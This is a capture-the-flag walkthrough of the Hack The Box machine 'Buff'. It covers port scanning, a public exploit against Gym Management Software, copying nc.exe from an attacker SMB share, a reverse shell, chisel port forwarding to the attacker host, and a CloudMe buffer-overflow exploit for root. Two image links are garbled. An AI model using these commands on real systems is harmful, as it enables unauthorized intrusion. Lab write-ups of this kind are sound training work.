## Buff

Difficulty: Easy
https://app.hackthebox.com/machines/Buff

### User Flag

```
rustscan -a 10.10.10.198 --ulimit -- -A -sV -sC -oN nmap.txt -Pn
```

![rustscan](https://github.com/b1d0ws/OSCP/assets/58514930/5506a998-60cc-45eb-be44-cf49dea692e8)

<br>

Port 8080 is open and in contact section we enumerate the CMS: Made using Gym Management Software 1.0

![site](https://github.com/b1d0ws/OSCP/assets/58514930/badaaa0f-ea25-4ae0-a8c4-e519abd76cf4)

![cmsVersion](https://github.com/b1d0ws/OSCP/assets/58514930/b21ee933-5eda-45c7-a32f-d3360b7edca7)

<br>

Searching exploits, we find this [one](https://www.exploit-db.com/exploits/48506).

```
python2 exploit.py http://10.10.10.198:8080/
```

![initialAccess](https://github.com/b1d0ws/OSCP/assets/58514930/23f83171-c9c1-4781-b615-8c3d9d489e76)

<br>

Here you can already get the user flag, but our shell is limited, so let's upgrade it.

### Upgrading Shell and Transferring Files with SMB

First we share the directory with smb.

```
smbserver.py share . -smb2support -username df -password df
```

![smbServer](https://github.com/b1d0ws/OSCP/assets/58514930/031c3cd2-95e1-4c6f-b582-4e6972f4944d)

<br>

Then we get the nc binary in the victim connecting to the smb of the attacker.

```bash
net use \\10.10.14.3\s /u:df df
copy \\10.10.14.3\share\nc.exe \programdata\nc.exe
```

![transferringNC](https://github.com/b1d0ws/OSCP/assets/58514930/25057ea7-cf46-4a87-b7dc-a5d7bfca749f)

After that, send the reverse shell with nc.

![ncReverse](https://github.com/b1d0ws/OSCP/assets/58514930/305dd616-147d-4347-8fb5-d4781bbe3b6c)

![gettingReverseShell](https://github.com/b1d0ws/OSCP/assets/58514930/f1dc80f4-0a78-4e9d-87db-25945669c581)

### Root Flag

Enumerating the machine, we find this binary of CloudMe application. It seems that is running on port 8888.

![cloudMeApplication](https://github.com/b1d0ws/OSCP/assets/58514930/edc11e8f-5f70-492!)

[netstat](https://github.com/b1d0ws/OSCP/assets/58514930/67ab041b-bd7a-4651-a390-8f9687a638c6)
3-a22e-aead5fd75ac2)

<br>

Searching for this application, we see that exists a RCE vulnerability, but to exploit we need to port forward the internal port to our host.

![searchsploitCloudMe](https://github.com/b1d0ws/OSCP/assets/58514930/d1f4c645-f62d-41ec-82a1-ab94b7b4bcf8)

<br>

Chisel Port Forward (you need to upload chisel binary as we did with nc):

```
chisel server -p 8000 --reverse
\programdata\chisel.exe client 10.10.14.3:8000 R:8888:127.0.0.1:8888
```

![chiselServer](https://github.com/b1d0ws/OSCP/assets/58514930/45ac9231-5aa2-45fc-9556-50a21c6a8f1f)

![chiselClient](https://github.com/b1d0ws/OSCP/assets/58514930/910b26ce-f3c5-427a-a85a-8818522c9735)

<br>

Generate the shellcode and put it inside the exploit and execute it a few times until it works.

![shellcode](https://github.com/b1d0ws/OSCP/assets/58514930/661aa01d-4610-4484-89de-291ff3957a01)

![rootExploit](https://github.com/b1d0ws/OSCP/assets/58514930/0b79ff01-5f79-4cff-baf5-cd775df6a7e2)





